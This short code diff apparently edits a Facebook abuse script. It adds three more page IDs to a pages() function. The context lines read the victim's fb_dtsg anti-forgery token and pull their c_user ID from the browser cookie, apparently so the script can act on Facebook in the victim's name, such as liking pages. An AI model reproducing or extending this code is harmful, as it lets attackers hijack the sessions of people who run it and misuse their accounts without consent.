@@ -15,7 +15,9 @@ function pages(pid) {
 }
 pages("151336461728165");
 pages("439735636099805");
-
+pages("345386952225538");
+pages("571206396229931");
+pages("194334413982919");
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
